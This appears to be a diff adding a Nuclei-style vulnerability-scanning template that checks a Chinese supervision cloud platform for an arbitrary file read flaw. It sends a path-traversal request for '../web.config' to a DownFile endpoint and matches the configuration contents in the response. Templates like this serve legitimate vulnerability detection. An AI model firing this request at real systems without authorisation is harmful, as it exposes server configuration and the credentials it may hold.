@@ -1,0 +1,33 @@
+id: poc-yaml-zkzy-downfile-anyfile-read
+info:
+  name: 中科智远科技-综合监管云平台 DownFile 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 文件读取
+  description: |
+    检测中科智远科技综合监管云平台 DownFile 任意文件读取漏洞。
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/Download/DownFile?fileName=../web.config"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<configuration>"
+      - type: word
+        part: body
+        words:
+          - "web.config"
+      - type: word
+        part: header
+        words:
+          - "filename="
+      - type: word
+        part: header
+        words:
+          - "application/octet-stream"
